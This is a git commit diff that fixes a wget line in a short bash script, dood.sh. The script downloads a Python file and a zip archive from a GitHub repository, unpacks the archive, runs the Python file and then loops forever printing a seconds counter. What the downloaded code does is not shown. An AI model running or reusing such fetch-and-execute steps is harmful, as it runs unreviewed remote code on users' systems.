776566f45a7bf624a2ed4f5a62639ad6917e2979
lianamahesra-creator <lianamahesra@gmail.com>
2026-08-19 08:50:22 +0700

    Fix wget command formatting in dood.sh

--- dood.sh
+++ dood.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lol.py
-wgethttps://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip
 unzip grok.zip
 python3 lol.py
 i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
